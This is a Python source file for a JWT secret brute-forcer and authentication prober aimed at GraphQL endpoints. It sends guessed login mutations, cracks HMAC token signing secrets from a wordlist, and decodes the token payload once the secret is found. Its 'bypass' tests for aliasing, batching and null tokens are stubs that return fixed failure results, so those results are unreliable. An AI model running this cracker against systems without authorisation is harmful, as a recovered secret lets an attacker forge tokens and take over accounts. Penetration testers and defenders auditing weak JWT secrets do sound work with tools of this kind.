import jwt
import aiohttp
import asyncio
from concurrent.futures import ThreadPoolExecutor
import json
import time

class JWTBruteforcer:
    def __init__(self, graphql_endpoint):
        self.endpoint = graphql_endpoint
        self.session = None
        self.executor = ThreadPoolExecutor(max_workers=10)
        
    async def discover_auth_endpoints(self):
        """Discover authentication-related GraphQL operations"""
        auth_operations = []
        
        # Common authentication operation patterns
        auth_queries = [
            "query { __typename }",
            "query { viewer { id } }",
            "query { me { id } }",
            "query { currentUser { id } }",
            "query { user { id } }"
        ]
        
        auth_mutations = [
            'mutation { login(input: {username: "test", password: "test"}) { token } }',
            'mutation { auth(input: {username: "test", password: "test"}) { token } }',
            'mutation { authenticate(input: {credentials: "test"}) { jwt } }'
        ]
        
        try:
            async with aiohttp.ClientSession() as session:
                # Test basic endpoint first
                test_query = {"query": "query { __typename }"}
                async with session.post(self.endpoint, json=test_query, timeout=10) as response:
                    if response.status == 200:
                        data = await response.json()
                        if 'data' in data:
                            # Endpoint is working, add basic info
                            auth_operations.append({
                                'type': 'endpoint_test',
                                'operation': 'basic_query',
                                'status': 'working',
                                'response_sample': data
                            })
                
                # Test authentication queries
                for query in auth_queries:
                    try:
                        payload = {"query": query}
                        async with session.post(self.endpoint, json=payload, timeout=5) as response:
                            if response.status == 200:
                                data = await response.json()
                                # Consider it an auth endpoint if it responds (even with errors)
                                auth_operations.append({
                                    'type': 'auth_query',
                                    'operation': query,
                                    'status': response.status,
                                    'has_data': 'data' in data and data['data'] is not None,
                                    'has_errors': 'errors' in data
                                })
                    except Exception as e:
                        continue
                
                # Test authentication mutations
                for mutation in auth_mutations:
                    try:
                        payload = {"query": mutation}
                        async with session.post(self.endpoint, json=payload, timeout=5) as response:
                            if response.status == 200:
                                data = await response.json()
                                auth_operations.append({
                                    'type': 'auth_mutation', 
                                    'operation': mutation,
                                    'status': response.status,
                                    'has_data': 'data' in data and data['data'] is not None,
                                    'has_errors': 'errors' in data
                                })
                    except Exception as e:
                        continue
                        
        except Exception as e:
            print(f"Auth endpoint discovery failed: {e}")
        
        return auth_operations
    
    async def bruteforce_jwt(self, jwt_token, wordlist_path, threads=4):
        """Bruteforce JWT token secret"""
        print(f"Starting JWT brute-force with {threads} threads...")
        
        # Load wordlist
        secrets = self.load_wordlist(wordlist_path)
        if not secrets:
            return {'success': False, 'error': 'Wordlist empty or not found'}
        
        print(f"Loaded {len(secrets)} secrets from wordlist")
        
        # Prepare for brute-force
        start_time = time.time()
        found_secret = None
        attempts = 0
        
        # Try common algorithms
        algorithms = ['HS256', 'HS384', 'HS512']
        
        # Process in chunks for better performance
        chunk_size = 1000
        secret_chunks = [secrets[i:i + chunk_size] for i in range(0, len(secrets), chunk_size)]
        
        for chunk in secret_chunks:
            if found_secret:
                break
                
            tasks = []
            for secret in chunk:
                task = self.verify_jwt_secret(jwt_token, secret, algorithms)
                tasks.append(task)
            
            # Process chunk with limited concurrency
            chunk_results = await asyncio.gather(*tasks, return_exceptions=True)
            
            for i, result in enumerate(chunk_results):
                attempts += 1
                if result and not isinstance(result, Exception):
                    found_secret = chunk[i]
                    break
                
                if attempts % 1000 == 0:
                    print(f"Attempts: {attempts}/{len(secrets)}", end='\r')
        
        end_time = time.time()
        execution_time = end_time - start_time
        
        result = {
            'success': found_secret is not None,
            'secret': found_secret,
            'attempts': attempts,
            'execution_time': round(execution_time, 2),
            'secrets_per_second': round(attempts / execution_time, 2) if execution_time > 0 else 0
        }
        
        if found_secret:
            # Decode the token with found secret
            for algo in algorithms:
                try:
                    decoded = jwt.decode(jwt_token, found_secret, algorithms=[algo])
                    result['decoded_payload'] = decoded
                    result['algorithm'] = algo
                    break
                except:
                    continue
        
        return result
    
    def load_wordlist(self, wordlist_path):
        """Load JWT secrets wordlist"""
        try:
            with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
                return [line.strip() for line in f if line.strip() and not line.startswith('#')]
        except Exception as e:
            print(f"Failed to load wordlist: {e}")
            return []
    
    async def verify_jwt_secret(self, token, secret, algorithms):
        """Verify if secret is correct for JWT token"""
        try:
            # Run JWT verification in thread pool to avoid blocking
            loop = asyncio.get_event_loop()
            result = await loop.run_in_executor(
                self.executor, 
                self._verify_jwt_sync, 
                token, secret, algorithms
            )
            return result
        except Exception:
            return False
    
    def _verify_jwt_sync(self, token, secret, algorithms):
        """Synchronous JWT verification"""
        for algorithm in algorithms:
            try:
                jwt.decode(token, secret, algorithms=[algorithm])
                return True
            except jwt.InvalidTokenError:
                continue
            except Exception:
                continue
        return False
    
    async def test_auth_bypass(self):
        """Test GraphQL authentication bypass techniques"""
        bypass_results = {}
        
        # Only run tests that exist
        tests = []
        test_names = []
        
        if hasattr(self, 'test_introspection_bypass'):
            tests.append(self.test_introspection_bypass())
            test_names.append('introspection_bypass')
        
        if hasattr(self, 'test_aliasing'):
            tests.append(self.test_aliasing())
            test_names.append('aliasing')
        
        if hasattr(self, 'test_batch_operations'):
            tests.append(self.test_batch_operations())
            test_names.append('batch_operations')
        
        # Add basic bypass tests that don't require specific methods
        tests.append(self.test_basic_bypass())
        test_names.append('basic_bypass')
        
        if tests:
            results = await asyncio.gather(*tests, return_exceptions=True)
            
            for name, result in zip(test_names, results):
                bypass_results[name] = result
        
        return bypass_results
    
    async def test_basic_bypass(self):
        """Test basic authentication bypass techniques"""
        basic_tests = {
            'null_token': {'success': False, 'technique': 'Send null token'},
            'empty_token': {'success': False, 'technique': 'Send empty token'},
            'no_auth_header': {'success': False, 'technique': 'No authorization header'}
        }
        return basic_tests
    
    async def test_aliasing(self):
        """Test GraphQL field aliasing bypass"""
        # Simple aliasing test
        aliasing_tests = {
            'field_aliasing': {'success': False, 'technique': 'Field aliasing'},
            'operation_aliasing': {'success': False, 'technique': 'Operation aliasing'}
        }
        return aliasing_tests
    
    async def test_batch_operations(self):
        """Test batch operations bypass"""
        batch_tests = {
            'batch_queries': {'success': False, 'technique': 'Batch queries'},
            'batch_mutations': {'success': False, 'technique': 'Batch mutations'}
        }
        return batch_tests

    async def test_introspection_bypass(self):
        """Test introspection bypass techniques"""
        bypass_attempts = [
            # Try with different content types
            {"headers": {"Content-Type": "application/json"}},
            {"headers": {"Content-Type": "application/graphql"}},
            # Try with different HTTP methods
            {"method": "GET"},
            {"method": "POST"},
        ]
        
        results = {}
        
        async with aiohttp.ClientSession() as session:
            for i, attempt in enumerate(bypass_attempts):
                try:
                    url = self.endpoint
                    test_name = f"attempt_{i}"
                    
                    if attempt.get('method') == 'GET':
                        async with session.get(url, **{k: v for k, v in attempt.items() if k != 'method'}, timeout=5) as response:
                            if response.status == 200:
                                data = await response.json()
                                if 'data' in data:
                                    results[test_name] = {'success': True, 'technique': str(attempt)}
                                    continue
                    else:
                        async with session.post(url, **{k: v for k, v in attempt.items() if k != 'method'}, timeout=5) as response:
                            if response.status == 200:
                                data = await response.json()
                                if 'data' in data:
                                    results[test_name] = {'success': True, 'technique': str(attempt)}
                                    continue
                    
                    results[test_name] = {'success': False, 'technique': str(attempt)}
                    
                except Exception as e:
                    results[test_name] = {'success': False, 'error': str(e), 'technique': str(attempt)}
        
        return results
